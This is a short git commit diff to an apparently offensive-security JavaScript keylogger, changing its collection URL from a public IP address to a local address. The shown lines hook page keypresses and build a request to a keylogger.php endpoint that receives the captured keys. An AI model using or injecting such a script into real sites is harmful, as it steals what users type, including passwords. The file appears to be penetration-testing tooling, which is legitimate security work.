4bb2bb377a9c816e18b910e136197bd2768905d8
Anushka Virgaonkar <anushka.virgaonkar@praetorian.com>
2024-03-06 15:17:52 -0600

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,5 +1,5 @@
 var keys='';
-var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
+var url = 'http://0.0.0.0:9000/keylogger.php?c=';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
